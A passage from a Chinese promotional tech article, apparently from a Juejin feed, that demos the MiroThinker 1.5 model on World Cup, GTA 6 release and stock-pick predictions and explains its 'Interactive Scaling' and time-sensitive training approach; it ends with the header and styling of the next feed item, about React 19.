<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d551f89acfb542aeb9e673a4c5642d94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=YC4VDwzLDW6zuV5N3pvDKN%2FLum4%3D" alt="" loading="lazy"/></p>
<p>根据上一步的反馈，模型会逐渐逼近最合理的答案。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb9cadbd82384bdba150c40e8951fae7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=9IUJW7dXpHgJNth%2B%2ByEF1SMjJ2s%3D" alt="" loading="lazy"/></p>
<p>在这一点上，近似于数学的迭代，都是从一个初始猜测值出发，通过反复的过程计算，将结果一步步收敛到真实解。</p>
<p>或者简单来说，就是和面时，水多了加面，面多了加水，最后总能成型。</p>
<p>那么再看输出的结果，和模型一般最后放结论不同，MiroThinker 1.5 直接开门见山，先给整体结论，以及详细的概率统计。<em>（用户体验感 UP！）</em></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2213bb16f0b4a6798b19391648806aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=SP91NWhETrXv0QAp4E7B1fpGxpk%3D" alt="" loading="lazy"/></p>
<p>然后它会对每一支热门球队都进行一一阐述，包括所在小组情况、各阶段的出线概率和多角度原因，乃至可能遇到的隐患。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/424fd6a6e63448a0b6199d1c9e81e6d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=%2FPMegcyO4zE9vK%2Bm4qfj%2BWfA3xc%3D" alt="" loading="lazy"/></p>
<p>即使是一些概率较低的可能性，它也能面面俱到。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18339c2fbeda4bc691fb43dfffb21173~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=wUMtWcUU9wuETaVf6SlgY8uv65E%3D" alt="" loading="lazy"/></p>
<p>不过显然，MiroThinker 1.5 在青春风暴 VS 老将最后一舞里，更支持前者。<em>（doge）</em></p>
<p>接着我们再预测一个经典问题：GTA 6 什么时候发？</p>
<p>也算是回归陈天桥的老本行了。</p>
<blockquote>
<p>GTA 6 明年能按时发布吗？请收集相关线索，给出确定性的回答。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15d79ff6613644798e78ee42683e96ab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=8JxUH34TcU4iGUmld%2FNfUrZABOk%3D" alt="" loading="lazy"/></p>
<p>很合理！预测逻辑严谨且层层递进，核心围绕着 R 星官方发布的权威信息，进行了多维度交叉验证，强化结果的可信度。</p>
<p>这次我们再将同样的问题，交给 ChatGPT、Gemini 和 DeepSeek，看看它们又会给出怎样的结果。</p>
<ul>
<li>ChatGPT：和 MiroThinker 1.5 的逻辑闭环相似，既遵循了行业规律，也为普通用户提供了建议。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d74736b76c3b44faa46af6ed9d3178a0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=w7yQjH3ByW6rATKlrKsO4vxzvg8%3D" alt="" loading="lazy"/></p>
<ul>
<li>Gemini：虽然把核心时间说清楚了，但证据支撑不足、缺乏风险提示。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48a1e452c31348758795cabbe5de5485~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=FeWfGxHJp4KjuWbMeZX6ULsNvcI%3D" alt="" loading="lazy"/></p>
<ul>
<li>DeepSeek：和 Gemini 类似，缺少关键背景补充，分析维度也相对单一。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee9d2e98bbff4d60aeb8fc1ca615397a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=yW7W%2BDOddtX3DatG8hgzyrnhg8k%3D" alt="" loading="lazy"/></p>
<p>有意思的是，仔细回看 Gemini 和 ChatGPT 的分析过程，它们都不约而同地在解释为什么 2025 年不能发……</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5e3cbd3fdb84187ac017493076aa1a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=yEYR3IolwBMSh0ik%2BDUzQ2Pxr%2Fs%3D" alt="" loading="lazy"/></p>
<p>一顿操作猛如虎，结果忘了已经 2026。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b568c751a1fa401cb3aea56884562bbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=bnSO8tnU7oyDmErMYgMrl98aNh4%3D" alt="" loading="lazy"/></p>
<p>更深入一步，最后我们尝试将 MiroThinker 1.5 放进专业场景中测试，比如<strong>股市预测</strong>。</p>
<blockquote>
<p>请根据今天 A 股的指数面，情绪面，板块以及前几天的情况，帮我选择一只连板梯队里最有可能晋级的股票。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc7c21e308fa4134929bb8d5406081c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=UVEbDxmyqsW5Q9OGGoMY6SV%2Bnh8%3D" alt="" loading="lazy"/></p>
<p><em>（注：以下仅为技术展示，不构成投资建议）</em></p>
<p>同样，MiroThinker 1.5 非常之快，不只是推理速度快，收集新信息的速度也相当快。</p>
<p>在股市这类不确定性强的复杂环境中，MiroThinker 1.5 能够做到有理有据，既不是凭感觉走的玄学赌徒，也不是事后找补的诸葛亮，而是在极度噪声化环境中做到证据集合和可验证的因果推断。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/029409425582449eb2c74d0b049c3dad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=nwJiJpemkdWiHIu0vFnLRFk3LTw%3D" alt="" loading="lazy"/></p>
<p>总之实测下来，MiroThinker 1.5 确实是一款区别于市面上同类产品的模型，调用轻松、思考过程可视、逻辑也更严明，不靠单一猜测下定论，而是在不断复盘交互中逐步逼近真相。</p>
<p>u1s1，光冲着这理性全面的证据链，就值得一个点赞。</p>
<h2 data-id="heading-1">将交互内化进模型推理，用确定性对抗不确定性</h2>
<p>问题是为什么 MiroMind 团队能率先做到这一点？</p>
<p>关键依然在 “大力出奇迹”。</p>
<p>在过去一年里，行业普遍存在的问题是过度依赖堆参数叠资源，本质来说就是让模型吃进更多知识，然后思维链沿着已记住的知识空间一步步往前推。</p>
<p>一旦其中一步发生偏离，后面所有步骤都会随着这个错误累计放大，最终导致整条逻辑链崩坏。</p>
<p>换言之，当模型参数规模到达一定程度后，继续堆资源对模型预测的边际收益只会迅速下降，行业不得不寻找新的智能增长路径。</p>
<p>MiroThinker 1.5 的解法恰恰在于将推理过程和外部环境深度绑定，为每一轮推理都引入一个反馈校验环节，构建起一整条 <strong>“推理 - 验证 - 修正”</strong> 的循环路径。</p>
<p>首先是将 <strong>Interactive Scaling</strong> 从原先的推理阶段前移，并内化为训练阶段的核心机制，把模型训练成一个更注重求证、校验和自我修正的探索型 Agent。</p>
<p>范式的转变决定了模型不再局限于内部知识和单次长链推理，而是通过和物理世界建立更深入的交互，以强化自身的行为模式：</p>
<ul>
<li><strong>Evidence-Seeking（主动求证）：模型会将每个关键判断拆解为可验证子假设，并主动发起对外查询、检索与比对。如果输出缺乏信源支撑，则会受到惩罚。</strong></li>
<li><strong>Iterative Verification（多轮校验与自我修正）：推理过程不再是一次性路径，而是允许反复回溯修正。当发现证据矛盾时，会立即进行调整，而非像传统思维链那样将错误延续下去。</strong></li>
<li><strong>Anti-Hallucination（对捷径的系统性过滤）：对过去一些看似合理但缺乏证据的推理结果给予否定，并标记为低质量推理。相比之下，更关注 “怎样得出答案”，而非只是简单的对错。</strong></li>
</ul>
<p>由此，MiroThinker 1.5 形成了行之有效的本能反应：</p>
<p>对于不确定性问题，先交互再判断；对于高风险结论，先查证再收敛。</p>
<p>模型不再依赖全部的世界知识，也无需那么多的参数支持，就能够按需地向外部世界精准取证，最终促成更小的参数规模，却拥有更高的智能密度。</p>
<p>而这正是 MiroThinker 1.5 推理成本显著降低，但性能始终保持一线水准的根本原因。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/78506bb3b3214c69be815694a5756f14~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=Tvv22xQd6p0TPZVO4YMOMtQwT58%3D" alt="" loading="lazy"/></p>
<p>其次是让模型杜绝复述结果，实现未来预测的关键因子——<strong>时序敏感训练沙盒</strong>。</p>
<p>传统大模型表面上看似是预测，实则只是在知识库里搜索结果并复述出来，或者是使用未来时间范畴的数据超前 “剧透”，时序敏感训练沙盒则为模型戴上一个 “紧箍咒”，严格约束只能使用当前可见的信息，并做出真实预测。</p>
<p>它可以分为两步，其一是可控数据合成引擎，负责构建覆盖多任务类型的、难度与时间戳可控的数据合成体系。</p>
<p>每一道题目的答案都会随着时间戳动态演化，判断过程会严格限制信息可见性，校验阶段同样也会显式引入时间戳约束，以确保推理逻辑和评分标准都符合真实世界的时间因果关系。</p>
<p>其二是时序敏感训练机制，在每一步训练中都只能访问当前时间戳之前的信息，从机制上彻底杜绝 Future Leakage_（未来信息泄露）_，模型无法超前看到结果。</p>
<p>这样下来，模型就会被迫学会在信息不完备、噪声存在、信号延迟的真实条件下完成推演，并随着新证据的出现不断修正判断。</p>
<p>时间也从原来被忽视的背景变量，升级为塑造模型行为与推理方式的核心约束，使模型更接近真实世界时序的认知与决策过程。</p>
<p>模型的预测能力不再是不可知的黑箱过程，而是可训练强化的关键要素。</p>
<p>当预测被拆解为一系列可约束、可反馈、可修正的行为模式之后，模型能力的上限也随之发生改变：<strong>性能提升不再简单取决于参数规模的线性扩张，而开始受益于模型与外部世界交互的方式与效率。</strong></p>
<h2 data-id="heading-2">做题家模式 VS 科学家模式</h2>
<p>而这套以小搏大的逻辑背后，正是 MiroMind 团队长期以来对 Scaling Law 的再解读。</p>
<p>早在模型 1.0 版本中，MiroMind 就首次系统性提出了除模型规模、上下文长度之外的第三大核心可扩展维度 Interactive Scaling，把智能的增长空间瞄准到外部世界。</p>
<p>V1.5 则是在此基础上，进一步落地融入贯穿训练与推理的全流程。</p>
<p>传统的 Scaling Law，走的是靠大脑更大解决问题的路线，本质上是 <strong>“做题家模式”</strong>，靠记忆和统计，而非真正理解和验证。</p>
<p>反之当模型内化 Interactive Scaling，它就不再是靠概率瞎猜，而是像<strong>科学家</strong>一样建立起慢思考的研究闭环：提出假设→向外部世界查数据 / 取证→发现对不上→修正假设→再查证，直到证据收敛到合理范围之内。</p>
<p>这样能有效降低 Scaling Law 导致的幻觉，提升可靠性。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/413e997921be465bbb4f0421c7907f18~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeP5a2Q5L2N:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768301524&amp;x-signature=5YK%2Fjj4JiXHHr2Px581SnGLxw4k%3D" alt="" loading="lazy"/></p>
<p>所以与其说这是算力的博弈，不如说是底层逻辑的转变在影响算力的着力点：算力没有集中用于模型的知识储备，毕竟知识无限，但算力始终有限。</p>
<p>有限的算力无法覆盖掉全部的知识，所以不妨转换思路，将算力效益最大化，也就是引向该去的地方——<strong>对外的信息获取与交互</strong>，把智能的扩展维度从 “更大脑袋” 变成“更勤快的手”。</p>
<p>这一点也与 MiroMind 始终强调的<strong>发现式智能</strong>不谋而合，即在未知条件下重建对世界的理解，抽丝剥茧发现真相而非简单地记住答案。</p>
<p>它不靠全知，而靠会研究、会查证、会修正。它能像顶级情报官一样对外极速取证、对内严苛去伪存真；像严谨研究员一样在不确定性里逼近真相，把 “预测未来” 从特权变成能力。</p>
<p>显然，陈天桥带领下的 MiroMind 已经率先转换赛道，找到了智能 “奇点” 的关键所在，是<strong>交互</strong>。</p>
<p><em>P.S. 如果感兴趣的话，可以加入官方社群：<br/>
Discord ：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.gg%2FF7EQFnYscV" target="_blank" title="https://discord.gg/F7EQFnYscV" ref="nofollow noopener noreferrer">discord.gg/F7EQFnYscV</a><br/>
微信社群：添加小助手 miromind001</em></p>
<p><em>体验网站：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdr.miromind.ai%2F" target="_blank" title="https://dr.miromind.ai/" ref="nofollow noopener noreferrer">dr.miromind.ai/</a><br/>
Github 代码地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMiroMindAI%2FMiroThinker" target="_blank" title="https://github.com/MiroMindAI/MiroThinker" ref="nofollow noopener noreferrer">github.com/MiroMindAI/…</a><br/>
MiroFlow 开源框架：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMiroMindAI%2FMiroFlow" target="_blank" title="https://github.com/MiroMindAI/MiroFlow" ref="nofollow noopener noreferrer">github.com/MiroMindAI/…</a><br/>
Hugging Face 模型下载：<a href="https://link.juejin.cn?target=https%3A%2F%2Fhuggingface.co%2Fmiromind-ai%2FMiroThinker-v1.5-235B" target="_blank" title="https://huggingface.co/miromind-ai/MiroThinker-v1.5-235B" ref="nofollow noopener noreferrer">huggingface.co/miromind-ai…</a></em></p>
<p><strong>欢迎在评论区留下你的想法！</strong></p>
<p>— <strong>完</strong> —</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 19 修复了一个遗留多年的类型乌龙，过程竞如此曲折]]></title>    <link>https://juejin.cn/post/7592058763986223150</link>    <guid>https://juejin.cn/post/7592058763986223150</guid>    <pubDate>2026-01-06T09:04:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592058763986223150" data-draft-id="7590961898399514662" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 19 修复了一个遗留多年的类型乌龙，过程竞如此曲折"/> <meta itemprop="keywords" content="前端,React.js"/> <meta itemprop="datePublished" content="2026-01-06T09:04:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Dikkoo"/> <meta itemprop="url" content="https://juejin.cn/user/3881723682895418"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 19 修复了一个遗留多年的类型乌龙，过程竞如此曲折
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3881723682895418/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Dikkoo
  </span> <!----> <!----> <div class="vip-level" data-v-cd7d0a50="" data-v-292f6e48=""><span class="tooltip" data-v-cd7d0a50=""><div class="byte-tooltip byte-tooltip--dark" style="display:none;">
        VIP.1 初学乍练
      </div><span class="byte-tooltip__wrapper"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="VIP.1 初学乍练" title="VIP.1 初学乍练" class="lazy" style="aspect-ratio:NaN;" data-v-5244ef91="" data-v-cd7d0a50=""/></span></span></div> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:04:22.000Z" title="Tue Jan 06 2026 09:04:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li 